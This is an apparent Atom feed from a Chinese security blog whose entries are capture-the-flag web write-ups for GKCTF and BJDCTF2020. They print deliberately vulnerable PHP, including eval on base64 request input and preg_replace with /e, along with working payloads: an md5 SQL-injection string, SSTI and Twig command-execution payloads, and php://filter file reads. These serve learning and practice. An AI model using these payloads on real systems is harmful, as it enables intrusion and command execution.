<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晴天`blog</title>
  
  <subtitle>如果你想要一个好的结局，取决于你在什么地方结束故事。--九号传教士</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://sunny250.github.io/"/>
  <updated>2020-05-26T12:09:17.000Z</updated>
  <id>https://sunny250.github.io/</id>
  
  <author>
    <name>sunny250</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GKCTF2019-web</title>
    <link href="https://sunny250.github.io/2020/05/26/GKCTF2019-web/"/>
    <id>https://sunny250.github.io/2020/05/26/GKCTF2019-web/</id>
    <published>2020-05-26T12:09:17.000Z</published>
    <updated>2020-05-26T12:09:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p>打开题目就有源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;GKCTF2020-CheckIN&quot;&gt;&lt;a href=&quot;#GKCTF2020-CheckIN&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="日常刷题" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="GKCTF" scheme="https://sunny250.github.io/tags/GKCTF/"/>
    
  </entry>
  
  <entry>
    <title>长亭科技面经</title>
    <link href="https://sunny250.github.io/2020/05/19/%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80%E9%9D%A2%E7%BB%8F/"/>
    <id>https://sunny250.github.io/2020/05/19/%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80%E9%9D%A2%E7%BB%8F/</id>
    <published>2020-05-19T13:13:28.000Z</published>
    <updated>2020-05-19T13:13:28.000Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=/js/crypto-js.js&gt;&lt;/script&gt;
&lt;script&gt;
function doDecrypt (pwd, onError) {
	console.log(&#39;in doDecrypt&#39;);
	const txt = document.getE
      
    
    </summary>
    
    
      <category term="日常" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>BJDCTF2020刷题记录</title>
    <link href="https://sunny250.github.io/2020/05/13/BJDCTF2020%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/05/13/BJDCTF2020%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-13T02:25:34.000Z</published>
    <updated>2020-05-13T02:25:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h2><p>在题目返回的http header中给出了提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure><p>要使得某个字符串的md5值转字符串后出现形如 <code>&#39;or&#39;1</code></p><a id="more"></a><p>自己懒得跑了直接百度一个  来自<a href="https://blog.csdn.net/qq_24810241/article/details/79908449" target="_blank" rel="noopener">https://blog.csdn.net/qq_24810241/article/details/79908449</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">md5(ffifdyop,32) &#x3D; 276f722736c95d99e921722cf9ed621c</span><br><span class="line">转成字符串为&#39;or&#39;6�]��!r,��b</span><br></pre></td></tr></table></figure><p>填入之后跳转到另一个界面，查看源码给出了提示</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET['a'];</span></span><br><span class="line"><span class="comment">$b = $_GET['b'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>传入数组绕过 <code>?a[]=0&amp;b[]=1</code></p><p>来到第三个页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以使用数组绕过，也可以使用相同md5生成器<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">fastcoll</a>生成两个相等md5，但是原始字符串不同</p><h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>扫描目录后发现存在git泄露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;flag.php (CODE:200|SIZE:0)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;index (CODE:200|SIZE:5725)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;config (CODE:200|SIZE:137)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F; (CODE:403|SIZE:555)</span><br></pre></td></tr></table></figure><p>使用githack获取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取到的index.php的部分关键代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x=pkey $y=pvalue</span></span><br><span class="line">    $$x = $y;    <span class="comment">//$$x=$pkey = $y=pvalue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x=gkey $y=gvalue</span></span><br><span class="line">    $$x = $$y;   $$flag=$$y=<span class="number">1</span>     <span class="comment">//$$x=$gkey = $gvalue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x = gkey $y = $gvalue</span></span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;   </span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure><p>这个题目考点就是源码阅读,疯狂套娃。如上分析，POST传入的参数如果是flag，结过就是<code>$flag=pvalue</code>将导致<code>$flag</code>被覆盖。</p><p>如果POST传入的参数不能为flag，就在第二个判断条件终止。就要使得<code>$yds=$flag</code></p><p>在第二个foreach中恰好满足条件，GET传入yds=flag,然后就是不执行第一个判断语句。如果未传入参数，if就不会执行。</p><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>打开题目是一个精美的界面</p><p><img src="/pic/160.png" alt=""></p><p>上面有一个flag.php，给出了ip地址，结合题目标题。添加一个X-Forwarded-For头部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;7*7&#125;</span><br></pre></td></tr></table></figure><p>页面变成了IP:49</p><p><img src="/pic/161.png" alt=""></p><p>是ssti没错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入&#123;phpinfo()&#125;成功执行</span><br><span class="line"></span><br><span class="line">&#123;system(&quot;cat &#x2F;flag&quot;)&#125;  即可拿到flag</span><br></pre></td></tr></table></figure><h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><p>给出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要让$text变成文件类型，使用为data协议或者远程文件包含,提示next.php文件，使用为协议读取文件源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I%20have%20a%20dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//next.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看见正则匹配函数有<code>/e</code>选项，可以命令执行 <a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">参考文章</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;assert(system(&quot;cat%20&#x2F;flag&quot;));</span><br></pre></td></tr></table></figure><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>还是和之前The mystery of ip一样的界面。flag界面变成了输入username</p><p><img src="/pic/163.png" alt=""></p><p>测试xss，sql注入，均无果。猜测可能还是ssti</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入&#123;7*7&#125;，无果再次测试&#123;&#123;7*7&#125;&#125;，发现返回了49,继续测试&#123;&#123;7*&#39;7&#39;&#125;&#125;，返回49</span><br></pre></td></tr></table></figure><p>附上测试流程</p><p><img src="/pic/162.png" alt=""></p><p>应该是twig</p><p>找payload，在<a href="https://www.cnblogs.com/cioi/" target="_blank" rel="noopener">Cxlover师傅的博客</a>找到了payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;falg&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>扫描目录发现备份文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F;index.php.swp (CODE:200|SIZE:1153)</span><br><span class="line">+ http:&#x2F;&#x2F;69d43586-fb6a-4cce-9174-915b9b1788e5.node3.buuoj.cn&#x2F;index.php (CODE:200|SIZE:1048)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: 